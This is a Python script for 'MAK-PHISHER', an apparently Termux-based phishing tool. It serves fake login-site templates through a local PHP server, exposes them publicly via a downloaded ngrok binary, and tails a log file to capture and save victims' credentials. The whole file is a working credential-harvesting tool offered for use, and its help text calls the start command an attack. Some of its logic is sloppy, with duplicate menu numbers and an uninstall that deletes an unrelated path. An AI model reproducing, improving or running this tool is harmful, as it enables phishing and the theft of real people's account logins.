'''MIT License

Copyright (c) 2023 Mursalin Ahamed Khan Alin 

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''
import requests , os
import wget
import re
import sys

red="\033[1;31;40m"
green="\033[1;32;40m"
yellow="\033[1;33;40m"
purple="\033[1;34;40m"
pink="\033[1;35;40m"
blue="\033[1;36;40m"

def banner():
	os.system("clear")
	print(f"""{blue}
	
{red}███╗   ███╗ █████╗ ██╗  ██╗     {yellow}██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
{red}████╗ ████║██╔══██╗██║ ██╔╝{yellow}     ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
{red}██╔████╔██║███████║█████╔╝█████╗{yellow}██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
{red}██║╚██╔╝██║██╔══██║██╔═██╗╚════╝{yellow}██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
{red}██║ ╚═╝ ██║██║  ██║██║  ██╗     {yellow}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝     ╚═╝ {yellow} ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                            
{blue}Created By {pink} Mursalin Ahamed Khan Alin                                                                                                 

		{red}Options --\n\n\n\n{green}[ 1 ] Help \n[ 2 ] show options
			

""")
dict={}
def show_folder():
	show=os.listdir("sites")
	for count,folder in enumerate(show,1):
		dict[count]=folder
def start_server(id):
	os.system("clear")
	print(f"{yellow}Starting PHP Server")
	os.chdir(f"sites/{dict[id]}")
	os.system("php -S localhost:4444  > /dev/null 2>&1 &")

def start_ngrok(path):
	try:
		os.chdir(path)
		if os.path.isfile("ngrok"):
			print(f"{yellow}Starting Ngrok Server ")
			os.system("./ngrok http 4444 > /dev/null 2>&1 &")
			os.system("sleep 5")
			os.system("termux-open-url http://localhost:4040")
		else:
			wget.download("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
			os.system("unzip ngrok*")
			os.system("rm ngrok-stable-linux-arm.zip")
			print(f"{yellow}Starting Ngrok Server ")
			os.system("./ngrok http 4444 > /dev/null 2>&1 &")
			os.system("sleep 5")
			os.system("termux-open-url http://localhost:4040")
	except:
		print(f"{red}Please Open Your Hotspot Otherwise You Cann't get link ")

def get_cred(id):
	os.chdir(f"sites/{dict[id]}")
	print(f"{red}[{blue}*{red}] {green} Waiting Credentials , {blue}Press ctrl+c To Exit")
	try:
		while(True):
			if os.path.isfile("log.txt"):
				os.system("tail -f log.txt")
	except:
		os.system("killall -9 php > /dev/null 2>&1 &")
		os.system("killall -9 ngrok > /dev/null 2>&1 &")
		file=input(f"{yellow}Are you want to save this credential on a file (Y/N): {green}")
		if file=="Y" or file=="y":
			file=input(f"{yellow}filename: {green}")
			os.system(f"mv log.txt {file}")
			os.system(f"mv {file} $HOME/MAK-PHISHER/files")
			print(f"{yellow}Thanks For Using This Tool.\033[0m")
			sys.exit()
		else:
			try:
				os.remove("log.txt")
				print(f"{yellow}Thanks For Using This Tool.\033[0m")
				sys.exit()
			except:
				pass
banner()
p=os.getcwd()
while(1):
	try:
		user=input(f"{blue}MAK-PHISHER =>{green} ")
		user=user.strip()
		if user=="Help" or user=="help" or user=="1":
			print(f"""{red} [ 1 ]search: {blue}By typing search you can find whatever you want related to phishing sites (example: searching instagram)
{red} [ 2 ]show: {blue}show all phishing sites
{red} [ 3 ]start: {blue}Start attack (example 
{blue}MAK-PHISHER => {green}start 
{yellow}No.: {green}Type the number according to given sequence (by type show in terminal)
{red} [ 4 ]id: {blue}It show your save ids
{red} [ 5 ]removeid: {blue}If you want to remove your save ids then type removeids
{red} [ 6 ]exit: {blue}Want to exit then write exit.
{red} [ 0 ]uninstall: {blue}if you want to delete this tool then type uninstall and here it is done.
{red}[ # ] Follow Me: {blue}You can enter into my profile by easily type follow me or # .
	""")
		elif user=="show" or user=="Show" or user=="2":
			show_folder()
			for count,file in dict.items():
				print(f"{red}[{green}{count}{red}] {yellow}{file}")
		elif user=="exit" or user=="Exit":
			print(f"{yellow}Thanks For Using This Tool.\033[0m")
			break
		elif user=="search" or user=="Search" or user=="1":
			print(f"{yellow}[00] Back")
			search=input(f"{yellow}Search: {green}")
			show_folder()
			if search==00 or search==0:
				continue
			print(f"{yellow}Number  phishingSites")
			for key,value in dict.items():
				r=re.findall(search+".*",value)
				if r:
					print(f"{yellow}{key} {red} {r}")
		elif user=="start" or user=="Start" or user=="2":
			print(f"{yellow}[00] Back")
			id=int(input(f"{yellow}No.: {green}"))
			if id==00 or id==0:
				continue
			show_folder()
			start_server(id)
			start_ngrok(p)
			get_cred(id)
		elif user=="id" or user=="Id" or user=="3":
			os.system("cat $HOME/MAK-PHISHER*/files/*")
		elif user=="removeid" or user=="4":
				os.system("rm $HOME/MAK-PHISHER*/files/*")
		elif user=="uninstall" or user=="Uninstall" or user=="0":
			os.system("rm -rf $HOME/a")
			break
		elif user=="Follow Me" or user=="follow me" or user=="#":
			os.system("termux-open-url https://www.facebook.com/mursalinahamedkhanalin")
		else:
			print(f"{red}Wrong Input")
	except:
		pass
